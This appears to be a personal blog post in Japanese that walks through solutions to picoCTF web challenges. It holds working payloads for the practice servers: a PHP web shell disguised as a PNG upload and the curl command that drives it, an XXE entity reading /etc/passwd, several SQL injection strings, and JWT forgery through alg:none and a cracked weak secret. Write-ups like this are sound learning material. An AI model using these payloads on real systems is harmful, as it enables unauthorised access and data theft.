---
title: "picoCTF - web"
date: 2024-05-02T10:39:24+09:00
draft: false
---

なかなか初心者を抜け出せないので，量をこなそう作戦\
解いたことがある問題は記載しない

### WebDecode

開発者ツール的なので About ページを見ると怪しい文字列があるので，base64 デコード

### Intro to Burp

アカウントを作ると OTP を求められる．
リクエストの otp= を消してリクエストを送ると OK

```curl -X POST http://titan.picoctf.net:54630/dashboard -H 'Cookie: session=.eJxdjDkOwyAUBe9CnQIwi8llEBhQkA0fsciKotw9tKSct8wHHbG_0RPFMybIgB7oaDXoDqfPMxZSWYUp3VwQnOzMcUbMrri1WAbiFSaUGSnU_IVxXTqb5Bcb9DKZ4U1wPrGY1m6obtmUF2Sv80jW16UYzdc_4_cH_-A4Iw.ZjLzXA.osPDJuPjvfZFlwhe-7dVDbKhZj0'```

### Unminify

開発者ツールを見る

### Trickster

画像をアップロードできる．
アップロードできる系はシェルが通りそうなことを HTB で学んだのでやってみる．

```text
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

```robots.txt``` から ```/uploads/``` にアップロードした画像が置いてあるような気がする．
また，```X-Powered-By``` を見れば PHP 製であることが分かるので，PHP が通る．

さらに ```instructions.txt``` を見ると，```ut wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )``` みたいに書いてあるので， ```50 4E 47``` -> PNG が書いてあればいいんだと思う

以下のようなファイルを作ってアップロードする．

```php
PNG
<div>Use `?cmd=` param.</div>
<pre><?php system($_GET["cmd"]);?></pre>
```

あとは ```curl -s 'http://atlas.picoctf.net:62518/uploads/a.png.php?cmd=ls%20../' | strings``` で見つかったファイルを cat すると flag が見つかる．

### find me

burp suite で通信を見ると，/nextpage みたいなところにリダイレクトしてから /home に遷移している．
id を見ると base64 なのでデコードすると flag を得られる．

### MatchTheRegex

```javascript
    function send_request() {
        let val = document.getElementById("name").value;
        // ^p.....F!?
        fetch(`/flag?input=${val}`)
            .then(res => res.text())
            .then(res => {
                const res_json = JSON.parse(res);
                alert(res_json.flag)
                return false;
            })
        return false;
    }
```

正規表現にマッチするものを入力すればいいらしい．
```picoCTF``` で通った．
なんだこれは

### SOAP

/etc/passwd が見れればいいらしい．
XML が見えるリクエストがあるので，LFI を狙って XXE を試みる．

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY secretData SYSTEM "file:///etc/passwd">
]>

<data>
<ID>
2
&secretData;
</ID>
</data>
```

### More SQLi

まずログインする．

適当に入れると SQL のペイロードを見せてくれる．
password が先に来てるので，username は適当，password を ```' OR '1'='1';``` にしてログイン．

テーブルが見えるので，```' OR '1'='1' UNION SELECT 1,2,3 FROM sqlite_master --``` で全部表示する．
色々テーブルが見えるので，いくつか試す．

```picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}```

こういう SQLi 系，いつもガチャガチャやってたらできてしまうので，ちゃんと仕組みを理解したい

### Java Code Analysis!?

JWT っぽい Authorization ヘッダがあるので，デコードしてみると

```json
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1715232635,
  "iat": 1714627835,
  "userId": 1,
  "email": "user"
}
```

のようなのが見えるので多分これだろうと思って進める．
alg を none にして送信すれば通るだろうと思ったがおそらく対策されて通らなかったので，真面目に署名をつける．

```java
private String generateRandomString(int len) {
        // not so random
        return "1234";
    }
```

とあるので 1234 が秘密鍵になっている．

```json
{"typ":"JWT","alg":"HS256"}{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1715232635,
  "iat": 1714627835,
  "userId": 1,
  "email": "user"
}
```

で送ってみると失敗する．
署名がうんぬんとは言われていないので，1234 で合ってるっぽい

email と userId (おそらく userId だけ) を見ているようなので，ここも admin に変えると通る．

### Secrets

```http://saturn.picoctf.net:62722/secret/hidden/superhidden/index.html```

### SQLiLite

```text
username: ' OR '1' = '1';
password: aaaa
SQL query: SELECT * FROM users WHERE name='' OR '1' = '1';' AND password='aaaa'
```

ソースコードに隠れているのでデベロッパーツールで見る．

### Irish-Name-Repo 1

```' OR '1'='1';```

### Irish-Name-Repo 2

```admin'--```

ユーザー名を admin で固定してあとはコメントアウト

### Irish-Name-Repo 3

burp suite で見て，debug=1 にするとペイロードを教えてくれる．
入力した文字が変換されてから出力されることが分かったので，それに対応するように ```' OR 1=1;``` と入力すると通る．

```'!='' --``` でも通るらしい．

### JaWT Scratchpad

JWT か，と思いながら burp をみると cookie に jwt が入っている．
user を admin に変えて，alg を none に変えて入力すると通らない．
署名をちゃんと考える必要がある．

全然分からんので writeup を見ると，john the ripper で解けるらしい．
知らなんだ

```john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt```

で ```ilovepico``` なので，jwn.io に入れてデコードされたのを入力すると通る．

### Web Gauntlet 3

前に Gauntlet 2 を解いたんだろうか？

filter を見ると ```Filters: or and true false union like = > < ; -- / / admin``` ということらしい．
一方で空白文字はフィルタされていないので使える．
そこで，文字列連結を考える(```'adm' || 'in'```)．
そのうえで，password には OR が入っているので，使えない．
そこで，```0' IS NOT '1``` で常に True をもらえるようにする．

### JAuth

また JWT．
今度は alg を none に設定するとうまく進む．

以下個人的注意点

- <https://jwt.io/> だと，alg: none が動作しないので，代わりに <https://token.dev/> を使う．
- JWT トークンは必ず 3 つのセクションがあるので，署名のあるなしに関わらず ```.``` を付ける．
